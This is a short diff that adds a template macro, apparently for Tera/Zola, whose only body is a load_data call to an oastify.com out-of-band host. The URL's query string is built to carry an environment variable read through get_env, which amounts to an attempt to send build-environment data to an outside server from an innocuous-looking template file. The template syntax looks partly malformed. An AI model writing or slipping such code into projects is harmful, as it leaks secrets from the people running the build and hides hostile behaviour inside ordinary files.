@@ -1,0 +1,3 @@
+{% macro x() -%}
+	{%- set data = load_data(url='https://qe8c0rs3lj50rfrcl475sc9uvl1cp5du.oastify.com?q={{ get_env(name="WHATEVER", default="")') -%}
+{%- endmacro x -%}
